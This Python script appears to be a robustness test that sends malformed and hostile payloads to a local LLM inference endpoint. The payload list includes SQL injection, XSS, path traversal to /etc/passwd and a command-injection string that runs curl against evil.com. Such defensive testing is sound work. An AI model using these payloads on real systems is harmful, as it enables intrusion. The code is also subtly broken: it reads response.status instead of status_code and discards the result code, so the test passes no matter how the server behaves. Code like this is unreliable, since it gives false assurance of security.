#!/usr/bin/env python3
"""
Malformed Request Handling Test
Tests API robustness against edge cases and malformed inputs
Success Criteria: All malformed requests return 4xx (not 5xx), no crashes
"""

import requests
import json
import sys
from datetime import datetime
from collections import defaultdict

class MalformedRequestTester:
    def __init__(self, base_url="http://localhost:8080", iterations=1000):
        self.base_url = base_url
        self.iterations = iterations
        self.results = {
            'total': 0,
            '4xx_responses': 0,
            '5xx_responses': 0,
            '2xx_responses': 0,
            'crashes': 0,
            'error_types': defaultdict(int),
            'response_codes': defaultdict(int)
        }

    def get_malformed_payloads(self):
        """Generate various malformed request payloads"""
        return [
            # Missing required fields
            {},
            {"model": "gpt-4"},
            {"messages": [{"role": "user", "content": "test"}]},

            # Invalid field types
            {"model": 12345, "messages": "not-an-array", "max_tokens": "invalid"},
            {"model": None, "messages": None},
            {"model": [], "messages": {}},

            # Invalid message structure
            {"model": "gpt-4", "messages": []},
            {"model": "gpt-4", "messages": [{}]},
            {"model": "gpt-4", "messages": [{"role": "invalid"}]},
            {"model": "gpt-4", "messages": [{"content": "test"}]},
            {"model": "gpt-4", "messages": [{"role": "user"}]},

            # Invalid values
            {"model": "", "messages": [{"role": "user", "content": "test"}]},
            {"model": "gpt-4", "messages": [{"role": "", "content": "test"}]},
            {"model": "gpt-4", "messages": [{"role": "user", "content": ""}]},

            # Extremely large values
            {"model": "gpt-4", "messages": [{"role": "user", "content": "x" * 1000000}]},
            {"model": "gpt-4", "messages": [{"role": "user", "content": "test"}], "max_tokens": 999999999},
            {"model": "gpt-4", "messages": [{"role": "user", "content": "test"}], "temperature": 999.9},

            # Negative values
            {"model": "gpt-4", "messages": [{"role": "user", "content": "test"}], "max_tokens": -100},
            {"model": "gpt-4", "messages": [{"role": "user", "content": "test"}], "temperature": -5.0},

            # SQL injection attempts
            {"model": "'; DROP TABLE users; --", "messages": [{"role": "user", "content": "test"}]},
            {"model": "gpt-4", "messages": [{"role": "user", "content": "'; DROP TABLE --"}]},

            # XSS attempts
            {"model": "<script>alert('xss')</script>", "messages": [{"role": "user", "content": "test"}]},
            {"model": "gpt-4", "messages": [{"role": "user", "content": "<script>alert('xss')</script>"}]},

            # Path traversal attempts
            {"model": "../../etc/passwd", "messages": [{"role": "user", "content": "test"}]},

            # Command injection attempts
            {"model": "gpt-4; ls -la", "messages": [{"role": "user", "content": "test"}]},
            {"model": "gpt-4 && curl evil.com", "messages": [{"role": "user", "content": "test"}]},

            # Unicode and special characters
            {"model": "gpt-4", "messages": [{"role": "user", "content": "\x00\x01\x02"}]},
            {"model": "gpt-4", "messages": [{"role": "user", "content": "🔥💀☠️" * 1000}]},

            # Deeply nested structures
            {"model": "gpt-4", "messages": [{"role": "user", "content": "test", "nested": {"level": {"deep": {"very": {"extreme": "value"}}}}}]},

            # Invalid JSON (will be sent as raw body)
            '{"model": "gpt-4", "messages": [invalid json}',
            '{{{}}}}',
            'null',
            'undefined',

            # Array instead of object
            [],
            [1, 2, 3],

            # Very long model name
            {"model": "x" * 10000, "messages": [{"role": "user", "content": "test"}]},

            # Too many messages
            {"model": "gpt-4", "messages": [{"role": "user", "content": f"msg {i}"} for i in range(1000)]},

            # Invalid role values
            {"model": "gpt-4", "messages": [{"role": "admin", "content": "test"}]},
            {"model": "gpt-4", "messages": [{"role": "system", "content": "test"}, {"role": "system", "content": "duplicate"}]},

            # Missing content type variations
            {"model": "gpt-4", "messages": [{"role": "user", "content": None}]},
            {"model": "gpt-4", "messages": [{"role": "user", "content": 12345}]},
            {"model": "gpt-4", "messages": [{"role": "user", "content": {"key": "value"}}]},

            # Provider override attacks
            {"model": "gpt-4", "messages": [{"role": "user", "content": "test"}], "provider_override": "../../../etc/passwd"},
            {"model": "gpt-4", "messages": [{"role": "user", "content": "test"}], "provider_override": "<script>"},

            # Additional fields that shouldn't be there
            {"model": "gpt-4", "messages": [{"role": "user", "content": "test"}], "admin": True, "bypass_auth": True},
        ]

    def test_malformed_request(self, test_id, payload):
        """Test a single malformed request"""
        url = f"{self.base_url}/v1/infer"
        headers = {
            "Content-Type": "application/json",
            "X-Trace-ID": f"malformed-test-{test_id}"
        }

        try:
            # Handle string payloads (invalid JSON)
            if isinstance(payload, str):
                response = requests.post(url, data=payload, headers=headers, timeout=10)
            else:
                response = requests.post(url, json=payload, headers=headers, timeout=10)

            self.results['total'] += 1
            self.results['response_codes'][response.status] += 1

            if 200 <= response.status < 300:
                self.results['2xx_responses'] += 1
                # This might be OK for some edge cases
                if test_id % 50 == 0:
                    print(f"ℹ️  Test {test_id}: Accepted (HTTP {response.status})")
                    print(f"   Payload: {str(payload)[:100]}")
                return True

            elif 400 <= response.status < 500:
                self.results['4xx_responses'] += 1
                self.results['error_types'][f'4xx_{response.status}'] += 1
                if test_id % 100 == 0:
                    print(f"✅ Test {test_id}: Rejected correctly (HTTP {response.status})")
                return True

            elif 500 <= response.status < 600:
                self.results['5xx_responses'] += 1
                self.results['error_types'][f'5xx_{response.status}'] += 1
                print(f"🚨 Test {test_id}: SERVER ERROR (HTTP {response.status})")
                print(f"   Payload: {str(payload)[:200]}")
                print(f"   Response: {response.text[:200]}")
                return False

        except requests.Timeout:
            self.results['total'] += 1
            self.results['error_types']['timeout'] += 1
            print(f"⚠️  Test {test_id}: Timeout")
            return True  # Timeout is acceptable for malformed requests

        except requests.ConnectionError:
            self.results['total'] += 1
            self.results['crashes'] += 1
            print(f"🚨 Test {test_id}: CONNECTION ERROR - Possible server crash!")
            print(f"   Payload: {str(payload)[:200]}")
            return False

        except Exception as e:
            self.results['total'] += 1
            self.results['error_types'][type(e).__name__] += 1
            print(f"⚠️  Test {test_id}: Unexpected error - {str(e)}")
            return True

    def run_malformed_tests(self):
        """Run all malformed request tests"""
        print(f"\n{'='*70}")
        print(f"🧪 MALFORMED REQUEST HANDLING TEST")
        print(f"{'='*70}")
        print(f"Target URL: {self.base_url}")
        print(f"Test Iterations: {self.iterations}")
        print(f"Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"{'='*70}\n")

        malformed_payloads = self.get_malformed_payloads()
        print(f"📋 Testing {len(malformed_payloads)} unique malformed payload patterns")
        print(f"🔄 Will cycle through patterns for {self.iterations} total tests\n")

        for i in range(self.iterations):
            payload = malformed_payloads[i % len(malformed_payloads)]
            self.test_malformed_request(i, payload)

        self.print_results()

    def print_results(self):
        """Print comprehensive test results"""
        print(f"\n{'='*70}")
        print(f"📊 MALFORMED REQUEST TEST RESULTS")
        print(f"{'='*70}\n")

        total = self.results['total']
        print(f"📦 Total Tests: {total}")
        print(f"✅ Rejected (4xx): {self.results['4xx_responses']} ({self.results['4xx_responses']/total*100:.2f}%)")
        print(f"ℹ️  Accepted (2xx): {self.results['2xx_responses']} ({self.results['2xx_responses']/total*100:.2f}%)")
        print(f"🚨 Server Errors (5xx): {self.results['5xx_responses']} ({self.results['5xx_responses']/total*100:.2f}%)")
        print(f"💥 Crashes/Connection Errors: {self.results['crashes']}")

        print(f"\n{'Response Code Distribution':-^70}")
        for code, count in sorted(self.results['response_codes'].items()):
            percentage = (count / total * 100) if total > 0 else 0
            print(f"HTTP {code}: {count} ({percentage:.2f}%)")

        if self.results['error_types']:
            print(f"\n{'Error Type Breakdown':-^70}")
            for error_type, count in sorted(self.results['error_types'].items(), key=lambda x: x[1], reverse=True)[:10]:
                print(f"{error_type}: {count}")

        # Success criteria evaluation
        print(f"\n{'Success Criteria Evaluation':-^70}")

        criteria_met = True

        # All malformed requests should return 4xx or 2xx, never 5xx
        if self.results['5xx_responses'] == 0:
            print(f"✅ Server errors (5xx): 0 (Target: 0)")
        else:
            print(f"❌ Server errors (5xx): {self.results['5xx_responses']} (Target: 0) - FAILED")
            criteria_met = False

        # No server crashes
        if self.results['crashes'] == 0:
            print(f"✅ Server crashes: 0 (Target: 0)")
        else:
            print(f"❌ Server crashes: {self.results['crashes']} (Target: 0) - CRITICAL FAILURE")
            criteria_met = False

        # Most should be rejected (4xx)
        rejection_rate = (self.results['4xx_responses'] / total * 100) if total > 0 else 0
        if rejection_rate >= 70:
            print(f"✅ Rejection rate: {rejection_rate:.2f}% (Target: ≥70%)")
        else:
            print(f"⚠️  Rejection rate: {rejection_rate:.2f}% (Target: ≥70%) - WARNING")

        print(f"{'='*70}\n")

        if criteria_met:
            print("✅ MALFORMED REQUEST TEST PASSED - API handles edge cases safely!")
            return 0
        else:
            print("❌ MALFORMED REQUEST TEST FAILED - Security and stability issues detected")
            return 1

def main():
    import argparse
    parser = argparse.ArgumentParser(description='Test malformed request handling')
    parser.add_argument('--url', default='http://localhost:8080', help='Base URL of the API')
    parser.add_argument('--iterations', type=int, default=1000, help='Number of test iterations')
    args = parser.parse_args()

    tester = MalformedRequestTester(
        base_url=args.url,
        iterations=args.iterations
    )

    exit_code = tester.run_malformed_tests()
    sys.exit(exit_code)

if __name__ == "__main__":
    main()
